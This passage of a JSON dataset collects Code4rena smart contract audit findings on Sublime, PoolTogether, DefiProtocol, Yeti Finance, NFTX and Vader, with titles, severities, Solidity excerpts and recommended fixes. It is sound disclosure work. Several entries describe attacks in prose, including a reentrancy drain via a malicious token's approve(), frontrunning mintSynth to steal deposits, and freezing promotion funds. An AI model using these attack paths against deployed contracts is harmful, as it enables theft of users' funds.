msg.sender.call{value: _tokenDiffBalance}('');\n          require(success, 'Transfer fail');\n      } else {\n          IERC20(_borrowAsset).safeTransfer(protocolFeeCollector, _protocolFee);\n          IERC20(_borrowAsset).safeTransfer(msg.sender, _tokenDiffBalance);\n      }\n      emit BorrowedFromCreditLine(_id, _tokenDiffBalance);\n  }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/124"
    }
  },
  {
    "title": "Wrong implementation of `NoYield.sol#emergencyWithdraw()`",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L78-L83\n\n```solidity=78{81}\nfunction emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {\n    require(_wallet != address(0), 'cant burn');\n    uint256 amount = IERC20(_asset).balanceOf(address(this));\n    IERC20(_asset).safeTransfer(_wallet, received);\n    received = amount;\n}\n```\n\n`received` is not being assigned prior to L81, therefore, at L81, `received` is `0`.\n\nAs a result, the `emergencyWithdraw()` does not work, in essence.\n\n### Recommendation\n\nChange to:\n\n```solidity=78\nfunction emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {\n    require(_wallet != address(0), 'cant burn');\n    received = IERC20(_asset).balanceOf(address(this));\n    IERC20(_asset).safeTransfer(_wallet, received);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/115"
    }
  },
  {
    "title": "Code Style: constants should be named in all caps",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nHere are some examples that the code style does not follow the best practices:\n\nhttps://github.com/code-423n4/2021-11-fei/blob/add34324513b863f58e4ef7b3cd0c12d776dbb7f/contracts/PegExchanger.sol#L9-L12\n```solidity=9\naddress public constant party0Timelock =\n    0x8ace03Fc45139fDDba944c6A4082b604041d19FC; // rgt timelock\naddress public constant party1Timelock =\n    0xd51dbA7a94e1adEa403553A8235C302cEbF41a3c; // tribe timelock\n```\n\nhttps://github.com/code-423n4/2021-11-fei/blob/add34324513b863f58e4ef7b3cd0c12d776dbb7f/contracts/PegExchanger.sol#L19-L20\n```solidity=19\nuint256 public constant token0InBase = 1000000;\nuint256 public constant token1OutBase = 26705673;\n```\n\nhttps://github.com/code-423n4/2021-11-fei/blob/add34324513b863f58e4ef7b3cd0c12d776dbb7f/contracts/PegExchanger.sol#L24-L27\n```solidity=24\nIERC20 public constant token0 =\n    IERC20(0xD291E7a03283640FDc51b121aC401383A46cC623); // rgt\nIERC20 public constant token1 =\n    IERC20(0xc7283b66Eb1EB5FB86327f08e1B5816b0720212B); //tribe\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-fei-findings",
      "repo": "https://github.com/code-423n4/2021-11-fei-findings",
      "url": "https://github.com/code-423n4/2021-11-fei-findings/issues/79"
    }
  },
  {
    "title": "`createPromotion()` Lack of input validation for `_epochDuration` can potentially freeze promotion creator's funds",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116\n\n```solidity=88\nfunction createPromotion(\n    address _ticket,\n    IERC20 _token,\n    uint216 _tokensPerEpoch,\n    uint32 _startTimestamp,\n    uint32 _epochDuration,\n    uint8 _numberOfEpochs\n) external override returns (uint256) {\n    _requireTicket(_ticket);\n\n    uint256 _nextPromotionId = _latestPromotionId + 1;\n    _latestPromotionId = _nextPromotionId;\n\n    _promotions[_nextPromotionId] = Promotion(\n        msg.sender,\n        _ticket,\n        _token,\n        _tokensPerEpoch,\n        _startTimestamp,\n        _epochDuration,\n        _numberOfEpochs\n    );\n\n    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);\n\n    emit PromotionCreated(_nextPromotionId);\n\n    return _nextPromotionId;\n}\n```\n\nIn the current implementation of `createPromotion()`, `_epochDuration` is allowed to be `0`.\n\nHowever, when `_epochDuration = 0`, it will be impossible for users to claim the rewards, and the promotion creator won't be able to cancel it.\n\n### PoC\n\n1. Alice called `createPromotion()` to create a promotion with the following parameters:\n    - _token: `USDC`\n    - _tokensPerEpoch: `10,000`\n    - _epochDuration: `0`\n    - _numberOfEpochs: `10`\n2. `100,000 USDC` was transferred from Alice to the `TwabRewards` contract;\n3. Users tries to `claimRewards()` but the transaction always revert at `_ticket.getAverageTotalSuppliesBetween()` -> `TwabLib.getAverageBalanceBetween()` due to div by 0.\n4. Alice tries to `cancelPromotion()` to retrieve the funds, but it always reverts at `_requirePromotionActive()` since the promotion already ended.\n\nAs a result, Alice's `100,000 USDC` is frozen in the contract.\n\n### Recommendation\n\nConsider adding `require(_epochDuration > 0)` in `createPromotion()`.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2021-12-pooltogether-findings",
      "url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106"
    }
  },
  {
    "title": "Contract does not work with fee-on transfer tokens",
    "severity": "major",
    "body": "# Handle\n\npmerkleplant\n\n\n# Vulnerability details\n\n## Impact\n\nThere exist ERC20 tokens that charge a fee for every transfer.\n\nThis kind of token does not work correctly with the `TwabRewards` contract as the\nrewards calculation for an user is based on `promotion.tokensPerEpoch` (see line [320](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L320)).\n\nHowever, the actual amount of tokens the contract holds could be less than\n`promotion.tokensPerEpoch * promotion.numberOfEpochs` leading to not claimable\nrewards for users claiming later than others.\n\n## Recommended Mitigation Steps\n\nTo disable fee-on transfer tokens for the contract, add the following code in\n`createPromotion` around line 11:\n```\nuint256 oldBalance = _token.balanceOf(address(this));\n_token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);\nuint256 newBalance = _token.balanceOf(address(this));\nrequire(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2021-12-pooltogether-findings",
      "url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/30"
    }
  },
  {
    "title": "Use of deprecated `safeApprove()` function",
    "body": "# Handle\n\nbroccolirob\n\n\n# Vulnerability details\n\nFrom Openzeppelin docs: \"Deprecated. This function has issues similar to the ones found in IERC20.approve, and its usage is discouraged.\"\n\n## Recommended Mitigation Steps\nInstead, fetch allowance first, then call safeIncreaseAllowance with max - diff.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/177"
    }
  },
  {
    "title": "Reentrancy vulnerability in `Basket` contract's `initialize()` method.",
    "severity": "medium",
    "body": "# Handle\n\nbroccolirob\n\n\n# Vulnerability details\n\n\nA malicious \"publisher\" can create a basket proposal that mixes real ERC20 tokens with a malicious ERC20 token containing a reentrancy callback in it's `approve()` method. When the `initialize()` method is called on the newly cloned `Basket` contract, a method called `approveUnderlying(address(auction))` is called, which would trigger the reentrancy, call `initialize()` again, passing in altered critical values such as `auction` and `factory`, and then removes its self from `proposal.tokens` and `proposal.weights` so it doesn't appear in the token list to basket users.\n\nhttps://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L44-L61\n\n## Impact\n`Auction` and `Factory` can be set to custom implementations that do malicious things. Since all baskets and auctions are clones with their own addresses, this fact would be difficult for users to detect. `Auction` controls ibRatio, which a malicious version could send back a manipulated value to `Basket`, allowing the malicious \"publisher\" to burn basket tokens till all users underlying tokens are drained.\n\n## Tools Used\nManual review and Hardhat.\n\n## Recommended Mitigation Steps\nSince `Basket` inherits from `ERC20Upgradeable` the `initializer` modifier should be available and therefore used here. It has an `inititializing` variable that would prevent this kind of reentrancy attack.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176"
    }
  },
  {
    "title": "Auction:settleAuction() cache address(basket)",
    "body": "# Handle\n\nGiveMeTestEther\n\n\n# Vulnerability details\n\n## Impact\nCache \"address(basket)\" in a local variable to save a few SLOADs. It gets read in three different loops of the settleAuction() function and during the assignment of \"basketAsERC20\".\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L74\n\n## Tools Used\nManual Analysis\n\n## Recommended Mitigation Steps\n- new local variable before the first loop: address _basket = address(basket);\n- replace the occurrences of address(basket) with the local variable\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/164"
    }
  },
  {
    "title": "Gas Optimization: Reorder storage layout",
    "body": "# Handle\n\ngzeon\n\n\n# Vulnerability details\n\n## Impact\nCan save gas by packing variable into less storage slots, for example:\n\n```\n--- a/contracts/contracts/Auction.sol\n+++ b/contracts/contracts/Auction.sol\n@@ -13,13 +13,14 @@ contract Auction is IAuction, ReentrancyGuard {\n     uint256 private constant BASE = 1e18;\n     uint256 private constant ONE_DAY = 1 days;\n     \n-    bool public override auctionOngoing;\n     uint256 public override auctionStart;\n-    bool public override hasBonded;\n     uint256 public override bondAmount;\n     uint256 public override bondTimestamp;\n     uint256 public override bondBlock;\n \n+    bool public override auctionOngoing;\n+    bool public override hasBonded;\n+\n     IBasket public override basket;\n     IFactory public override factory;\n     address public override auctionBonder;\n```\n\n```\n--- a/contracts/contracts/Basket.sol\n+++ b/contracts/contracts/Basket.sol\n@@ -21,14 +21,16 @@ contract Basket is IBasket, ERC20Upgradeable, ReentrancyGuard {\n \n     uint256 public maxSupply;\n \n-    address public publisher;\n     uint256 public licenseFee;\n \n+    uint256 public override ibRatio;\n+    \n+    uint256 public override lastFee;\n+\n+    address public publisher;\n     IFactory public override factory;\n     IAuction public override auction;\n \n-    uint256 public override ibRatio;\n-\n     PendingPublisher public pendingPublisher;\n     PendingLicenseFee public pendingLicenseFee;\n     PendingWeights public pendingWeights;\n```\n\nNote that this probably isn't the most efficient ordering, for best result variables that will be used together should be put into the same slot if possible.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/129"
    }
  },
  {
    "title": "`Auction.sol#initialize()` Use msg.sender rather than factory_ parameter can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L49-L57\n\n```solidity=49{54}\nfunction initialize(address basket_, address factory_) public override {\n    require(address(factory) == address(0));\n    require(!initialized);\n\n    basket = IBasket(basket_);\n    factory = IFactory(factory_);\n    initialized = true;\n}\n```\n\n`Auction.sol#initialize()` is using the factory_ parameter as the value of `factory`, while `Basket.sol#initialize()` uses `msg.sender`.\n\nhttps://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L44-L61\n\n```solidity=44{50}\nfunction initialize(IFactory.Proposal memory proposal, IAuction auction_) external override {\n    require(address(factory) == address(0));\n    require(!initialized);\n\n    publisher = proposal.proposer;\n    licenseFee = proposal.licenseFee;\n    factory = IFactory(msg.sender);\n    auction = auction_;\n    ibRatio = BASE;\n    tokens = proposal.tokens;\n    weights = proposal.weights;\n    maxSupply = proposal.maxSupply;\n    approveUnderlying(address(auction));\n\n    __ERC20_init(proposal.tokenName, proposal.tokenSymbol);\n\n    initialized = true;\n}\n```\n\nConsider changing to `msg.sender` and removing the `factory_` parameter for the purpose of consistency and gas saving.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/126"
    }
  },
  {
    "title": "Unnecessary checked arithmetic in for loops",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i = 0; i < weights.length; i++)`).\n\nIncrements perform overflow checks that are not necessary in this case.\n\n### Recommendation\n\nSurround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:\n\n\nhttps://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L289-L293\n\n```solidity=289\nfor (uint256 i = 0; i < weights.length; i++) {\n    uint256 tokenAmount = amount * weights[i] * ibRatio / BASE / BASE;\n    require(tokenAmount > 0);\n    IERC20(tokens[i]).safeTransferFrom(from, address(this), tokenAmount);\n}\n```\n\nto\n\n```solidity=289\nfor (uint256 i = 0; i < weights.length;) {\n    uint256 tokenAmount = amount * weights[i] * ibRatio / BASE / BASE;\n    require(tokenAmount > 0);\n    IERC20(tokens[i]).safeTransferFrom(from, address(this), tokenAmount);\n    unchecked { ++i; }\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-defiprotocol-findings",
      "repo": "https://github.com/code-423n4/2021-12-defiprotocol-findings",
      "url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/121"
    }
  },
  {
    "title": "Unsafe approve in sYETIToken",
    "severity": "minor",
    "body": "# Handle\n\n0x1f8b\n\n\n# Vulnerability details\n\n## Impact\nUnsafe approve was done.\n\n## Proof of Concept\nIn the method `sYETIToken.buyBack` it's made an approve without checking the boolean result, ERC20 standard specify that the token can return false if the approve was not made, so it's mandatory to check the result of approve methods.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nUse safeApprove or check the boolean result\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/286"
    }
  },
  {
    "title": "Only using `SafeMath` when necessary can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the arithmetic operations that will never over/underflow, using SafeMath will cost more gas.\n\nFor example:\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L791-L795\n\n```solidity=791\nif (_debtChange > _variableYUSDFee) { // if debt decrease, and greater than variable fee, decrease \n    newDebt = _troveManager.decreaseTroveDebt(_borrower, _debtChange.sub(_variableYUSDFee));\n} else { // otherwise increase by opposite subtraction\n    newDebt = _troveManager.increaseTroveDebt(_borrower, _variableYUSDFee.sub(_debtChange));\n}\n```\n\n`_debtChange - _variableYUSDFee` at L792 and `_variableYUSDFee - _debtChange` at L794 will never underflow.\n\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/YUSDToken.sol#L240-L241\n\n```solidity=240\n_totalSupply = _totalSupply.add(amount);\n_balances[account] = _balances[account].add(amount);\n```\n\n`_balances[account] + amount` will not overflow if `_totalSupply.add(amount)` dose not overflow. \n\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/YUSDToken.sol#L248-L249\n\n```solidity=248\n_balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n_totalSupply = _totalSupply.sub(amount);\n```\n\n`_totalSupply - amount` will not underflow if `_balances[account].sub(amount)` dose not underflow. \n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/281"
    }
  },
  {
    "title": "Tokens with fee on transfer are not supported",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `BorrowerOperations.sol#_transferCollateralsIntoActivePool()` assumes that the received amount is the same as the transfer amount, and uses it as collateral.\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L731-L748\n\n```solidity=731\n    function _transferCollateralsIntoActivePool(\n        address _from,\n        address[] memory _colls,\n        uint256[] memory _amounts\n    ) internal returns (bool) {\n        uint256 len = _amounts.length;\n        for (uint256 i = 0; i < len; i++) {\n            address collAddress = _colls[i];\n            uint256 amount = _amounts[i];\n            IERC20 coll = IERC20(collAddress);\n\n            bool transferredToActivePool = coll.transferFrom(_from, address(activePool), amount);\n            if (!transferredToActivePool) {\n                return false;\n            }\n        }\n        return true;\n    }\n```\n\n## Recommended\n\n- Compare the before and after `balanceOf` to get the actual transferred amount;\n- Or, not to whitelist any tokens with fee on transfer.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/268"
    }
  },
  {
    "title": "Adding unchecked directive can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\nFor example:\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/ERC20_8.sol#L68-L70\n\n```solidity=68\n        require(_num_tokens <= balances[msg.sender], \"You are trying to transfer more tokens than you have\");\n\n        balances[msg.sender] = balances[msg.sender] - _num_tokens;\n```\n\n`balances[msg.sender] - _num_tokens` will never underflow.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/261"
    }
  },
  {
    "title": "`ERC20_8.sol` `totalSupply` should be increased on `mint` and decreased on `burn`",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/ERC20_8.sol#L128-L144\n\n```solidity\n// ------------------------------------------------------------------------\n// Mint new tokens to a given _to address\n// ------------------------------------------------------------------------\nfunction _mint(address _to, uint _num_tokens) internal returns (bool success) {\n    balances[_to] = balances[_to] + _num_tokens;\n    emit Transfer(address(0), _to, _num_tokens);\n    return true;\n}\n\n// ------------------------------------------------------------------------\n// Burn tokens owned by _holder\n// ------------------------------------------------------------------------\nfunction _burn(address _holder, uint _num_tokens) internal returns (bool success) {\n    balances[_holder] = balances[_holder].sub(_num_tokens);\n    emit Transfer(_holder, address(0), _num_tokens);\n    return true;\n}\n```\n\n`totalSupply` is one of the essential view methods of an ERC20 contract. When tokens get `mint` and `burn`, it is supposed to update the `totalSupply`.\n\nThe current implementation does provide a `totalSupply()` view function, but the storage variable `_totalSupply` will never be updated.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/259"
    }
  },
  {
    "title": "Race condition on ERC20 approval",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/YUSDToken.sol#L253-L259\n\n```solidity=253\nfunction _approve(address owner, address spender, uint256 amount) internal {\n    assert(owner != address(0));\n    assert(spender != address(0));\n\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n}\n```\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/YETI/YETIToken.sol#L206-L209\n\n```solidity=206\nfunction _approve(address owner, address spender, uint256 amount) internal {\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n}\n```\n\nhttps://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/YETI/sYETIToken.sol#L133-L137\n\n```solidity=133\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n```\n\nUsing approve() to manage allowances opens yourself and users of the token up to frontrunning.\nBest practice, but doesn't usually matter.\n\n[Explanation](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit) of this possible attack vector\n\nSee also: [0xProject/0x-monorepo#850](https://github.com/0xProject/0x-monorepo/issues/850)\n\nA potential fix includes preventing a call to approve if all the previous tokens are not spent through adding a check that the allowed balance is 0:\n\n`require(allowed[msg.sender][_spender] == 0)`.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/252"
    }
  },
  {
    "title": "SafeMath with Solidity 0.8",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nSome contracts, e.g. ERC20_8, WJLP. are compiled with Solidity version >0.8, but still use SafeMath library.\nIt is not necessary, as with this new version safe operations are handled by default.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-yetifinance-findings",
      "repo": "https://github.com/code-423n4/2021-12-yetifinance-findings",
      "url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/246"
    }
  },
  {
    "title": "NFTXMarketplaceZap: Add rescue() function",
    "severity": "minor",
    "body": "# Handle\n\nGreyArt\n\n\n# Vulnerability details\n\n## Impact\n\nA `rescue()` function exists for the StakingZap contract to help retrieve any accidental fund transfer to it. It would be beneficial to have this function exist in the MarketplaceZap contract too.\n\n## Recommended Mitigation Steps\n\nInclude the `rescue()` function.\n\n```jsx\nfunction rescue(address token) external onlyOwner {\n\tIERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this)));\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-nftx-findings",
      "repo": "https://github.com/code-423n4/2021-12-nftx-findings",
      "url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/226"
    }
  },
  {
    "title": "NFTXLPStaking: Implementation Upgrade Storage Layout Caution",
    "body": "# Handle\n\nGreyArt\n\n\n# Vulnerability details\n\n## Impact\n\nFrom what we understand, the contracts upgrade will be performed in place, where the relevant current proxies will be pointing to the new implementations. An important restriction when doing so is that the order of which the contract state variables are declared, and their types **must be preserved.** More information can be found in [OpenZeppelin’s documentation](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#modifying-your-contracts).\n\nFor the NFTXLPStaking contract, the [version of the May contest review](https://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol) was:\n\n```jsx\ncontract NFTXLPStaking is OwnableUpgradeable {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    INFTXVaultFactory public nftxVaultFactory;\n    INFTXFeeDistributor public feeDistributor;\n    RewardDistributionTokenUpgradeable public rewardDistTokenImpl;\n    StakingTokenProvider public stakingTokenProvider;\n\n    event PoolCreated(uint256 vaultId, address pool);\n    event PoolUpdated(uint256 vaultId, address pool);\n    event FeesReceived(uint256 vaultId, uint256 amount);\n\n    struct StakingPool {\n        address stakingToken;\n        address rewardToken;\n    }\n    mapping(uint256 => StakingPool) public vaultStakingInfo;\n\n    function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer {\n...\n```\n\nwhile the new version is\n\n```jsx\ncontract NFTXLPStaking is PausableUpgradeable {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    INFTXVaultFactory public nftxVaultFactory;\n    IRewardDistributionToken public rewardDistTokenImpl;\n    StakingTokenProvider public stakingTokenProvider;\n\n    event PoolCreated(uint256 vaultId, address pool);\n    event PoolUpdated(uint256 vaultId, address pool);\n    event FeesReceived(uint256 vaultId, uint256 amount);\n\n    struct StakingPool {\n        address stakingToken;\n        address rewardToken;\n    }\n    mapping(uint256 => StakingPool) public vaultStakingInfo;\n\n    TimelockRewardDistributionTokenImpl public newTimelockRewardDistTokenImpl;\n\n    function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer {\n...\n```\n\nNote that the `feeDistributor` has been removed. Also note that a new base contract has been added (`PausableUpgradeable` which inherits `OwnableUpgradeable`), which has 2 mappings `isGuardian` and `isPaused`. \n\nWe however note that the current `NFTXLPStaking` implementation at [`https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code`](https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code) is a more recent version than that of the previous contest review. There is no change in the storage layout between this deployed version against the one being reviewed.\n\nThe ordering of state variables is determined by the C3-linearized order of contracts, so there does not seem to have been any storage collision with the change from `OwnableUpgradeable` to `PausableUpgradeable`. It also appears that the public variables are returning expected values.\n\n## Recommended Mitigation Steps\n\nUpgrading implementations are a tricky affair. It is highly recommended to use tools like OpenZeppelin’s upgrade plugins that validate that the new implementation is upgrade safe and is compatible with the previous one.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-nftx-findings",
      "repo": "https://github.com/code-423n4/2021-12-nftx-findings",
      "url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/220"
    }
  },
  {
    "title": "Unsafe approve in NFTXSimpleFeeDistributor",
    "severity": "minor",
    "body": "# Handle\n\n0x1f8b\n\n\n# Vulnerability details\n\n## Impact\nUnsafe approve was done.\n\n## Proof of Concept\nIn the method `NFTXSimpleFeeDistributor._sendForReceiver` it's made a approve without checking the boolean result, ERC20 standard specify that the token can return false if the approve was not made, so it's mandatory to check the result of approve methods.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nUse safe approve or check the boolean result\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-nftx-findings",
      "repo": "https://github.com/code-423n4/2021-12-nftx-findings",
      "url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/186"
    }
  },
  {
    "title": "`VaderPoolV2` minting synths & fungibles can be frontrun",
    "severity": "major",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nThe `VaderPoolV2` `mintFungible` and `mintSynth` functions perform an unsafe `nativeAsset.safeTransferFrom(from, address(this), nativeDeposit)` with a parameter-specified `from` address.\n\nNote that these functions are not called by the Router, they are directly called on the pool.\nTherefore, users will usually be required to send two transactions, a first one approving the pool, and then a second one for the actual `mintSynth`.\n\nAn attacker can frontrun the `mintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)` function, use the same `from=victim` parameter but change the `to` parameter to the attacker.\n\n## Impact\nIt's possible to frontrun victims stealing their native token deposits and receiving synths / fungible tokens.\n\n## Recommended Mitigation Steps\nRemove the `from` parameter and always perform the `safeTransferFrom` call with `from=msg.sender`.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-vader-findings",
      "repo": "https://github.com/code-423n4/2021-12-vader-findings",
      "url": "https://github.com/code-423n4/2021-12-vader-findings/issues/147"
    }
  },
  {
    "title": "Lack of decimal control in StakingRewards",
    "severity": "minor",
    "body": "# Handle\n\n0x1f8b\n\n\n# Vulnerability details\n\n## Impact\nGive more or less tokens than expected.\n\n## Proof of Concept\nThe contract `StakingRewards` has an ERC20 token for rewards, all the rewards are computed assuming that this token has 18 decimals, but this check was never done in the constructor, so if you want to use a StackingRewards with for example USDT (6 decimals), you will obtain undesired results.\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nCheck that the reward token has 18 decimals\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-vader-findings",
      "repo": "https://github.com/code-423n4/2021-12-vader-findings",
      "url": "https://github.com/code-423n4/2021-12-vader-findings/issues/129"
    }
  },
  {
    "title": "repayDebt optimization",
